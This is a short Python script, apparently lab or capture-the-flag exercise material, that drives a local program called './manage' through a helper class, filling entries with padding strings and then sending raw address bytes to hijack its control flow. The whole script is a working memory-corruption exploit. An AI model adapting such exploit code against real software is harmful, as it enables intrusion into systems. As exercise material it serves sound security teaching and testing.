#!/usr/bin/python3
import os, sys
parent_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(parent_dir)
from helper import Program


# TODO: Rewrite this function (do not touch anything else).
def exploit():
    prog = Program("./manage")

    for i in range(4):
        print(prog.read_line())
    prog.send_line("A")
    for i in range(16):
        print(prog.read_line())
        prog.send_line("A"*15)
        for j in range(6):
            print(prog.read_line())
    print(prog.read_line())
    prog.send_line("A")
    print(prog.read_line())
    prog.send_line("\x96\x07\x40")
    for i in range(5):
        print(prog.read_line())
    prog.send_line("E")
    print(prog.read_line())
    



    
    


if __name__ == "__main__":
    exploit()
